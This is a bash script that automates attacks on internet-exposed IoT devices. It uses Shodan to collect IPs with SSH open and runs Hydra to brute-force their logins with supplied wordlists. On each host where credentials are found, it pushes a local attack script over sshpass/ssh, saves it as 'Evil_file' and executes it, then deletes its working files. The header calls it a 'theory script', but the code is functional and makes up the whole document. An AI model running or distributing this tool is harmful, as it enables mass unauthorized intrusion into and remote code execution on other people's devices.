#!/bin/bash
##################################################
#  This is a theory script on how to automate    #
#  the process of hacking into IoT devices and   #
#  devices in general. This script spcifically   #
#  finds open SSH services running on IoTs that  #
#  were stated in the user input. The process    #
#  has 3 stages: Scanning and finding IPs with   #
#  shodan, Brute forcing the SSH creds with Hydra#
#  and finally run an attack automatically.      #
##################################################

if [ "$#" -ne 2 ]; then
	echo "${0##*/}, IoT hacking automation example script."
    echo "[X] Usage: ./${0##*/} <usernames file> <passwords file> (This will be provided for hydra to Brute-Force)"
    echo "    Example: ./${0##*/} usernames.lst passwords.lst"
    exit
fi

# Stage 1: Scan and Find ips:
read -p 'Provide the search string: ' SEARCH_STR
echo "[>] Starting Shodan search on: $SEARCH_STR"
shodan search --fields ip_str,port,org $SEARCH_STR | grep -w 22 | awk '{print $1}' > ip.lst
echo "== IPs Found in Search: =="
cat ip.lst

# Stage 2: Brute Force every IP:
touch hydra_results.txt
echo "[>] Starting hydra on the IPs above:"
for IP in $(cat ip.lst); do
	echo "[>] Running attack on $IP"
	hydra -t 4 -L $1 -P $2 ssh://$IP | grep host >> hydra_results.txt
done

# Stage 3: Run Some Automated Attack:
cat hydra_results.txt | while read LINE ; do
	echo $LINE
	IP=$(echo $LINE | awk '{print $3}')
	echo "[+] Creds for $IP are:"
	USERNAME=$(echo $LINE | awk '{print $5}')
	PASSWORD=$(echo $LINE | awk '{print $NF}')
	echo "$USERNAME:$PASSWORD"
	# Make sure you have auto_attack_script ready to cat out.
	cat auto_attack_script.sh | sshpass -p $PASSWORD ssh $USERNAME@$IP 'cat > Evil_file;bash Evil_file'
done

# Cleaning residual files:
rm ip.lst
rm hydra_results.txt
